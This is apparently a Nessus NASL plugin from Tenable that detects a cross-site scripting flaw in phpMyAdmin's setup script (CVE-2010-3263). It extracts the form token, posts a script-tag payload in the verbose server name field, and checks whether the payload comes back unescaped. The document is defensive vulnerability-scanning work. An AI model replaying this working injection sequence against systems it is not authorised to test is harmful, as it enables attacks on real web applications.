#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(49142);
  script_version("$Revision: 1.13 $");
  script_cvs_date("$Date: 2015/10/07 15:36:47 $");

  script_cve_id("CVE-2010-3263");
  script_osvdb_id(67851);
  script_xref(name:"TRA", value:"TRA-2010-02");

  script_name(english:"phpMyAdmin setup.php Verbose Server Name XSS (PMASA-2010-7)");
  script_summary(english:"Tries to inject script via verbose server name");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a PHP application that has a cross-
site scripting vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The setup script included with the version of phpMyAdmin installed on
the remote host does not properly sanitize user-supplied input to the
'verbose server name' field.

A remote attacker could exploit this by tricking a user into
executing arbitrary script code."
  );
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/research/tra-2010-02");
  script_set_attribute(attribute:"see_also", value:"http://www.phpmyadmin.net/home_page/security/PMASA-2010-7.php");
  script_set_attribute(attribute:"solution", value:"Upgrade to phpMyAdmin 3.3.7 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/09/08");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/09/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/09/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phpmyadmin:phpmyadmin");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("phpMyAdmin_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phpMyAdmin");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");


port = get_http_port(default:80, php:TRUE);
install = get_install_from_kb(appname:'phpMyAdmin', port:port, exit_on_fail:TRUE);

# Bail on versions != 3.x, which are not vulnerable
if (install['ver'] =~ '^[0-9]' && install['ver'] !~ '^3\\.')
  exit(0, 'phpMyAdmin '+install['ver']+' on port '+port+' is not affected.');

# The first request makes sure the page exists and extracts the token
url = install['dir']+'/setup/index.php';
full_url = build_url(qs:install['dir']+'/', port:port);
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

# Extract the token.
token = NULL;
pat = 'input type="hidden" name="token" value="([^"]+)"';
match = eregmatch(string:res[2], pattern:pat);
if (match) token = match[1];
else exit(1, "Unable to extract token from "+build_url(qs:url, port:port));

# The second request attempts the XSS
xss = '<script>alert(\''+SCRIPT_NAME+'-'+unixtime()+'\')</script>';
unreserved = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*-]?=&";
xss_encoded = urlencode(str:xss, unreserved:unreserved);
expected_out = '<td>' + xss + '</td>';

# the exploit won't work unless all these parameters are provided :/
postdata = 'check_page_refresh=1&token=' + token + '&Servers-0-verbose=' + xss_encoded + '&Servers-0-host=localhost&Servers-0-port=&Servers-0-socket=&Servers-0-connect_type=tcp&Servers-0-extension=mysqli&Servers-0-auth_type=cookie&Servers-0-user=root&Servers-0-password=&Servers-0-auth_swekey_config=&submit_save=Save&Servers-0-SignonSession=&Servers-0-SignonURL=&Servers-0-LogoutURL=&Servers-0-only_db=&Servers-0-hide_db=&Servers-0-AllowRoot=on&Servers-0-DisableIS=on&Servers-0-AllowDeny-order=&Servers-0-AllowDeny-rules=&Servers-0-ShowDatabasesCommand=SHOW+DATABASES&Servers-0-CountTables=on&Servers-0-pmadb=&Servers-0-controluser=&Servers-0-controlpass=&Servers-0-verbose_check=on&Servers-0-bookmarktable=&Servers-0-relation=&Servers-0-table_info=&Servers-0-table_coords=&Servers-0-pdf_pages=&Servers-0-column_info=&Servers-0-history=&Servers-0-designer_coords=';
res = http_send_recv3(
  method:"POST",
  item:url + '?page=servers',
  port:port,
  data:postdata,
  content_type:"application/x-www-form-urlencoded",
  exit_on_fail:TRUE
);

# The third request checks to see if it was successful
res = http_send_recv3(
  method:"GET",
  item:url,
  port:port,
  exit_on_fail:TRUE
);

if (expected_out >< res[2])
{
  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

  if (report_verbosity > 0)
  {
    report =
      '\nBy making a series of requests, Nessus was able to determine the'+
      '\nfollowing phpMyAdmin installation is vulnerable :\n\n' +
      '  ' + full_url + '\n';
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else exit(0, 'The phpMyAdmin install at '+full_url+' is not affected.');
